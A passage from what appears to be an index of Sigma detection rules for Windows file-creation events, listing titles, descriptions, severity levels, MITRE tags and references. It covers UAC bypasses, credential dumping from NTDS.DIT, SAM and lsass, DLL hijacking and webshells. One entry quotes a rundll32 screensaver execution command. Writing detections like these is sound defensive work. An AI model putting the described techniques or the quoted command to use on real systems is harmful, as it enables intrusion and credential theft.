    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_eventvwr.yml
* https://twitter.com/orange_8361/status/1518970259868626944?s=20&t=RFXqZjtA7tWM3HxqEH78Aw

* https://twitter.com/splinter_code/status/1519075134296006662?s=12&t=DLUXH86WtcmG_AZ5gY3C6g

    
### Suspicious Word Cab File Write CVE-2021-40444
    
    Detects file creation patterns noticeable during the exploitation of CVE-2021-40444

    * Level: critical
    * MITRE: attack.resource_development
    * MITRE: attack.t1587
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_winword_cve_2021_40444.yml
* https://twitter.com/RonnyTNL/status/1436334640617373699?s=20

* https://twitter.com/vanitasnk/status/1437329511142420483?s=21

    
### New Shim Database Created in the Default Directory
    
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.
The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_creation_new_shim_database.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-2---new-shim-database-files-created-in-the-default-shim-database-directory

    
### PsExec Tool Execution
    
    Detects PsExec service installation and execution events (service and Sysmon)

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_tool_psexec.yml
* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://jpcertcc.github.io/ToolAnalysisResultSheet

    
### Suspicious Get-Variable.exe Creation
    
    Get-Variable is a valid PowerShell cmdlet
WindowsApps is by default in the path where PowerShell is executed.
So when the Get-Variable command is issued on PowerShell execution, the system first looks for the Get-Variable executable in the path and executes the malicious binary instead of looking for the PowerShell cmdlet.


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1546
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_get_variable.yml
* https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/

* https://www.joesandbox.com/analysis/465533/0/html

    
### Suspicious NTDS.DIT Creation
    
    Detects suspicious creations of a file named ntds.dit, e.g. by a PowerShell parent or in a suspicious directory or a suspicious one liner

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_ntds_dit.yml
* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

* https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/

* https://pentestlab.blog/tag/ntds-dit/

* https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1

    
### Powerup Write Hijack DLL
    
    Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation. In it's default mode, it builds a self deleting .bat file which executes malicious command. The detection rule relies on creation of the malicious bat file (debug.bat by default).

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_detect_powerup_dllhijacking.yml
* https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/

    
### Suspicious Scheduled Task Write to System32 Tasks
    
    Detects the creation of tasks from processes executed from suspicious locations

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.execution
    * MITRE: attack.t1053
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_task_write.yml
* Internal Research

    
### Malicious PowerShell Commandlet Names
    
    Detects the creation of known powershell scripts for exploitation

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_powershell_exploit_scripts.yml
* https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml

* https://github.com/PowerShellMafia/PowerSploit

* https://github.com/NetSPI/PowerUpSQL

* https://github.com/CsEnox/EventViewer-UACBypass

    
### PCRE.NET Package Temp Files
    
    Detects processes creating temp files related to PCRE.NET package

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_pcre_net_temp_file.yml
* https://twitter.com/rbmaslen/status/1321859647091970051

* https://twitter.com/tifkin_/status/1321916444557365248

    
### Startup Folder File Write
    
    A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_startup_folder_file_write.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/12

* https://threathunterplaybook.com/evals/apt29/detections/5.B.1_611FCA99-97D0-4873-9E51-1C1BA2DBB40D.html

    
### RedMimicry Winnti Playbook Dropped File
    
    Detects actions caused by the RedMimicry Winnti playbook

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_redmimicry_winnti_filedrop.yml
* https://redmimicry.com

    
### Suspicious Screensaver Binary File Creation
    
    Adversaries may establish persistence by executing malicious content triggered by user inactivity.
Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_creation_scr_binary_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md

    
### Creation of an WerFault.exe in Unusual Folder
    
    Detects WerFault copoed to a suspicious folder, which could be a sign of WerFault DLL hijacking

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_werfault_dll_hijacking.yml
* https://www.bleepingcomputer.com/news/security/hackers-are-now-hiding-malware-in-windows-event-logs/

    
### Rclone Config File Creation
    
    Detects Rclone config file being created

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_rclone_exec_file.yml
* https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/

    
### SCR File Write Event
    
    An attacker may execute an application as a .SCR File (Screensaver) using rundll32.exe desk.cpl,InstallScreenSaver

    * Level: medium
    * MITRE: attack.t1218.011
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_new_src_file.yml
* https://lolbas-project.github.io/lolbas/Libraries/Desk/

    
### Outlook Form Installation
    
    Detects the creation of new Outlook form which can contain malicious code

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1137.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_outlook_newform.yml
* https://twitter.com/blueteamsec1/status/1401290874202382336?s=20

    
### Dumpert Process Dumper
    
    Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_hack_dumpert.yml
* https://github.com/outflanknl/Dumpert

* https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/

    
### CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum
    
    Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1566
    * MITRE: attack.t1203
    * MITRE: cve.2021.33771
    * MITRE: cve.2021.31979
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml
* https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/

* https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/

    
### Created Files by Office Applications
    
    This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_script_creation_by_office_using_file_ext.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### CVE-2022-24527 Microsoft Connected Cache LPE
    
    Detects files created during the local privilege exploitation of CVE-2022-24527 Microsoft Connected Cache

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1059.001
    * MITRE: cve.2022.24527
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cve_2022_24527_lpe.yml
* https://www.rapid7.com/blog/post/2022/04/12/cve-2022-24527-microsoft-connected-cache-local-privilege-escalation-fixed/

    
### Cred Dump Tools Dropped Files
    
    Files with well-known filenames (parts of credential dump software or files produced by them) creation

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.003
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cred_dump_tools_dropped_files.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Anydesk Temporary Artefact
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_anydesk_artefact.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows

    
### AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl
    
    Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_winrm_awl_bypass.yml
* https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404

    
### Creation Exe for Service with Unquoted Path
    
    Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.
Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. 


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_creation_unquoted_service_path.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.009/T1574.009.md

    
### Suspcious CLR Logs Creation
    
    Detects suspicious .NET assembly executions. Could detect using Cobalt Strike's command execute-assembly.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1059.001
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_clr_logs.yml
* https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html

* https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/

* https://github.com/olafhartong/sysmon-modular/blob/master/11_file_create/include_dotnet.xml

    
### UAC Bypass Using MSConfig Token Modification - File
    
    Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_msconfig_gui.yml
* https://github.com/hfiref0x/UACME

    
### WScript or CScript Dropper
    
    Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe or wscript.exe

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_win_cscript_wscript_dropper.yml
* WScript or CScript Dropper (cea72823-df4d-4567-950c-0b579eaf0846)

    
### Installation of TeamViewer Desktop
    
    TeamViewer_Desktop.exe is create during install

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_install_teamviewer_desktop.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-1---teamviewer-files-detected-test-on-windows

    
### Suspicious NTDS Exfil Filename Patterns
    
    Detects suspicious creations of files with names used in various tools that export the NTDS.DIT for exfiltration

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_ntds_exfil_tools.yml
* https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/ntds_grabber.rb

* https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/NTDSgrab.ps1

* https://github.com/SecureAuthCorp/impacket/blob/7d2991d78836b376452ca58b3d14daa61b67cb40/impacket/examples/secretsdump.py#L2405

    
### SAM Dump File Creation
    
    Detects the creation of files that look like exports of the local SAM (Security Account Manager)

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_sam_dump.yml
* https://github.com/search?q=CVE-2021-36934

* https://github.com/cube0x0/CVE-2021-36934

* https://www.google.com/search?q=%22reg.exe+save%22+sam

* https://github.com/HuskyHacks/ShadowSteal

* https://github.com/FireFart/hivenightmare

    
### Powershell Profile.ps1 Modification
    
    Detects a change in profile.ps1 of the Powershell profile

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.013
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_powershell_profile_create.yml
* https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/

    
### ISO or Image Mount Indicator in Recent Files
    
    Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_iso_file_recent.yml
* https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/

* https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore

* https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/

* https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/

    
### Mimikatz MemSSP Default Log File Creation
    
    Detects Mimikatz MemSSP default log file creation

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_mimimaktz_memssp_log_file.yml
* https://pentestlab.blog/2019/10/21/persistence-security-support-provider/

    
### Windows Shell File Write to Suspicious Folder
    
    Detects a Windows executable that writes files to suspicious folders

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_win_shell_write_susp_directory.yml
* No references

    
### CrackMapExec File Creation Patterns
    
    Detects suspicious file creation patterns found in logs when CrackMapExec is used

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_crackmapexec_patterns.yml
* https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass

    
### Outlook C2 Macro Creation
    
    Detects the creation of a macro file for Outlook. Goes with win_outlook_c2_registry_key. VbaProject.OTM is explicitly mentioned in T1137. Particularly interesting if both events Registry & File Creation happens at the same time.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.command_and_control
    * MITRE: attack.t1137
    * MITRE: attack.t1008
    * MITRE: attack.t1546
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_outlook_c2_macro_creation.yml
* https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/

    
### Windows Webshell Creation
    
    Possible webshell file creation on a static web site

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_webshell_creation_detect.yml
* PT ESC rule and personal experience

    
### Detection of SafetyKatz
    
    Detects possible SafetyKatz Behaviour

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_ghostpack_safetykatz.yml
* https://github.com/GhostPack/SafetyKatz

    
### Typical HiveNightmare SAM File Export
    
    Detects files written by the different tools that exploit HiveNightmare

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    * MITRE: cve.2021.36934
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_hivenightmare_file_exports.yml
* https://github.com/GossiTheDog/HiveNightmare

* https://github.com/FireFart/hivenightmare/

* https://github.com/WiredPulse/Invoke-HiveNightmare

* https://twitter.com/cube0x0/status/1418920190759378944

    
### Suspicious Unattend.xml File Access
    
    Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_access_susp_unattend_xml.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md

    
### Unidentified Attacker November 2018
    
    A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_apt_unidentified_nov_18.yml
* https://twitter.com/DrunkBinary/status/1063075530180886529

    
### Suspicious PROCEXP152.sys File Created In TMP
    
    Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder. This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.

    * Level: medium
    * MITRE: attack.t1562.001
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_procexplorer_driver_created_in_tmp_folder.yml
* https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/

    
### UAC Bypass Using Consent and Comctl32 - File
    
    Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_consent_comctl32.yml
* https://github.com/hfiref0x/UACME

    
### TeamViewer Remote Session
    
    Detects the creation of log files during a TeamViewer remote session

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_teamviewer_remote_session.yml
* https://www.teamviewer.com/en-us/

    
### Suspicious Interactive PowerShell as SYSTEM
    
    Detects the creation of files that indicator an interactive use of PowerShell in the SYSTEM user context

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_system_interactive_powershell.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PowerSploit_Invoke-Mimikatz.htm

    
### CVE-2021-26858 Exchange Exploitation
    
    Detects possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for | creation of non-standard files on disk by Exchange Server’s Unified Messaging service | which could indicate dropping web shells or other malicious content

    * Level: critical
    * MITRE: attack.t1203
    * MITRE: attack.execution
    * MITRE: cve.2021.26858
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cve_2021_26858_msexchange.yml
* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

    
### Wmiprvse Wbemcomn DLL Hijack
    
    Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI DLL Hijack scenario.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_wmiprvse_wbemcomn_dll_hijack.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html

    
### Mimikatz Kirbi File Creation
    
    Detects the creation of files that contain Kerberos tickets based on an extension used by the popular tool Mimikatz

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1558
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_mimikatz_kirbi_file_creation.yml
* https://cobalt.io/blog/kerberoast-attack-techniques

    
### Dump Office Macro Files from Commandline
    
    A office file with macro is created from a commandline or a script

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_macro_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md

* https://docs.microsoft.com/en-us/deployoffice/compat/office-file-format-reference

    
### Octopus Scanner Malware
    
    Detects Octopus Scanner Malware.

    * Level: high
    * MITRE: attack.t1195
    * MITRE: attack.t1195.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_mal_octopus_scanner.yml
* https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain

    
### Writing Local Admin Share
    
    Aversaries may use to interact with a remote network share using Server Message Block (SMB).
This technique is used by post-exploitation frameworks.


    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1546.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_writing_local_admin_share.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-4---execute-command-writing-output-to-local-admin-share

    
### Pingback Backdoor
    
    Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_pingback_backdoor.yml
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel

* https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406

    
### Suspicious PFX File Creation
    
    A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_pfx_file_creation.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/14

* https://threathunterplaybook.com/evals/apt29/detections/6.B.1_6392C9F1-D975-4F75-8A70-433DEDD7F622.html

    
### Suspicious VHD Image Download From Browser
    
    Malware can use mountable Virtual Hard Disk .vhd file to encapsulate payloads and evade security controls

    * Level: medium
    * MITRE: attack.resource_development
    * MITRE: attack.t1587.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_mal_vhd_download.yml
* https://redcanary.com/blog/intelligence-insights-october-2021/

* https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/

* https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/

    
### Suspicious ADSI-Cache Usage By Unknown Tool
    
    Detects the usage of ADSI (LDAP) operations by tools. This may also detect tools like LDAPFragger.

    * Level: high
    * MITRE: attack.t1001.003
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_adsi_cache_usage.yml
* https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961

* https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/

* https://github.com/fox-it/LDAPFragger

    
### Microsoft Office Add-In Loading
    
    Detects add-ins that load when Microsoft Word or Excel starts (.wll/.xll are simply .dll fit for Word or Excel).

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1137.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_office_persistence.yml
* Internal Research

    
### UAC Bypass Abusing Winsat Path Parsing - File
    
    Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_winsat.yml
* https://github.com/hfiref0x/UACME

    
### UAC Bypass Using Windows Media Player - File
    
    Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_wmp.yml
* https://github.com/hfiref0x/UACME

    
### Suspicious Desktopimgdownldr Target File
    
    Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_desktopimgdownldr_file.yml
* https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

* https://twitter.com/SBousseaden/status/1278977301745741825

    
### Created Files by Microsoft Sync Center
    
    This rule detects suspicious files created by Microsoft Sync Center (mobsync)

    * Level: medium
    * MITRE: attack.t1055
    * MITRE: attack.t1218
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_creation_by_mobsync.yml
* https://redcanary.com/blog/intelligence-insights-november-2021/

    
### ScreenConnect Temporary Installation Artefact
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_screenconnect_artefact.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows

    
### File Created with System Process Name
    
    Detects the creation of an executable with a system process name in a suspicious folder

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_creation_system_file.yml
    
### UAC Bypass Using .NET Code Profiler on MMC
    
    Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_dotnet_profiler.yml
* https://github.com/hfiref0x/UACME

    
### Moriya Rootkit
    
    Detects the use of Moriya rootkit as described in the securelist's Operation TunnelSnake report

    * Level: critical
